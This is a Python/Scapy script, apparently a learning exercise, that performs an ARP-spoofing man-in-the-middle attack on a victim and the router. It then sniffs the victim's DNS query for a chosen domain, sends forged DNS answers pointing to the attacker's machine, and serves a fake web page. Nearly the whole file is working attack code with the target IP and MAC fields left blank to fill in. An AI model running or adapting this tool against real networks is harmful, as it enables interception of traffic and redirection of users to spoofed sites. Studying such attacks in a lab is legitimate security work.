from scapy.all import *
import threading
import time
from os import system
import socket

#fill the details instead of the empty ""
victim = {"IP":"" , "MAC":""}
router = {"Default Gateway":"","MAC":""}
thisPc = {"IP":"","MAC":""} 
DOMAIN = "tuna" 	#for example : tuna.com


try:
	serversocket = socket.socket()
	serversocket.bind(("0.0.0.0",80))		#listen to everyone, port 80-http connections
	serversocket.listen(5)
except: 
	print "error - can't open server socket"
	exit(-1)

system("echo 1 > /proc/sys/net/ipv4/ip_forward") 	#enable ip forward

class Arpspoof(threading.Thread):

	def __init__(self):
		'''
		Enter Statement: the function doesn't get paramas
		Exit Statement: the function build and send a packet to the victim
		'''
		threading.Thread.__init__(self)
		self.__pack = ARP()			
		self.__pack[ARP].op = 2		#ARP answer
		self.__pack[ARP].psrc = router["Default Gateway"]
		#self.__pack[ARP].hwsrc= thisPc["MAC"]
		self.__pack[ARP].pdst = victim["IP"]
		self.__pack[ARP].hwdst= victim["MAC"]
		
		self.__routerpack = ARP()
		self.__routerpack[ARP].op = 2
		self.__routerpack[ARP].psrc = victim["IP"]
		#self.__routerpack[ARP].hwsrc = thisPc["MAC"]
		self.__routerpack[ARP].pdst = router["Default Gateway"]
		self.__routerpack[ARP].hwdst = router["MAC"]
		
		#flags for the loops that sending the DNS\ARP packets.
		self.__arploop = True
	
	 
	def setArpLoop(self,value):
		'''
		Enter Statement: the function gets a True\False value
		Exit Statement: the function sets the value in the arploop property
		'''
		self.__arploop = value
		
	 
	def run(self):
		'''
		Enter Statement: the function doesn't get parameters
		Exit Statement:the function run the arp spoof thread
		'''
		
		while self.__arploop:
			send(self.__pack,verbose=False)
			send(self.__routerpack,verbose=False)
		

def create_send_file(sock):
	'''
	Enter Statement: the function gets the victim socket
	Exit Statement: the function create a file and send it to the victim	
	'''
	file = open("fake.html","w+")
	file.write(
		'<html><head></head><body><marquee> <h1>It worked! this is a fake website</h1> </marquee> </body></html>'
	)
	file.close()
	file = open("fake.html","r")
	piece = file.read(1024)
	while piece:
		send_data(piece,sock)
		piece = file.read(1024)
	file.close()

def send_data(data,clientsocket):
	'''
	Enter Statement: the function gets data (string)
	Exit Statement: the function send the data via the server socket
	'''
	try:
		clientsocket.send(data)
	except socket.error:
		print "error , can't send the data"

	

def DNSspoof_packet(packet):
	'''
	Enter Statement: the function doesn't get paramaeters
	Exit Statement: the function return the fake DNS packet to send to the victim.
	'''
	pack = IP()/UDP()/DNS()
	pack[IP].dst = victim["IP"]
	pack[IP].src = router["Default Gateway"]
	pack[UDP].dport = packet[UDP].sport							
	pack[UDP].sport = packet[UDP].dport			
	pack[DNS].qr=long(1)
	pack[DNS].id = packet[DNS].id
	#pack[DNS].qdcount = 1
	#pack[DNS].ancount = 1
	pack[DNS].rcode = 0
	pack[DNS].an = DNSRR()
	#pack[DNSRR].rclass=1
	pack[DNSRR].rrname = packet[DNSQR].qname		#the domain is the qname 
	pack[DNS].qd = packet[DNSQR]
	pack[DNSRR].rdata = thisPc["IP"]		
	pack[DNSRR].ttl = 100	
	return pack

def dnsfilter(packet):
	return IP in packet and DNS in packet and packet[IP].src==victim["IP"] and DOMAIN in packet[DNSQR].qname
	
#========================================================================================


arp = Arpspoof()
print "start sending arp packet to the victim..."
arp.start()					#start sending the arp packets
print "ARP spoofing - Done\n"

dnspackets = sniff(lfilter = dnsfilter, count = 1)
print "dns packet from victim arrived! sending the fake answer..."
fake_dns_packet = DNSspoof_packet(dnspackets[0])
for _ in range(50):
	send(fake_dns_packet,verbose=False)


try:
	print "Waiting for victim connection..."
	victimsocket,victimaddress = serversocket.accept()
	print "Victim connection accepted, waiting for the http get request..."
	http_request = victimsocket.recv(1024)
except socket.error:
	print "victim connection failed."

print "Send to the victim the fake page..."
create_send_file(victimsocket)

print "DNS spoofing - Done"
victimsocket.close()
stop = raw_input("Press any key to stop the arp spoofing")	
arp.setArpLoop(False)

#GARP = update their ARP cache
send(ARP(op=2,pdst=router["Default Gateway"],psrc=victim["IP"],hwdst="ff:ff:ff:ff:ff:ff",hwsrc=victim["MAC"]),verbose=False)
send(ARP(op=2,pdst=victim["IP"],psrc=router["Default Gateway"],hwdst="ff:ff:ff:ff:ff:ff",hwsrc=router["MAC"]),verbose=False)
system("echo 0 > /proc/sys/net/ipv4/ip_forward")	#disable ip forward
print "exit..."



	 
	

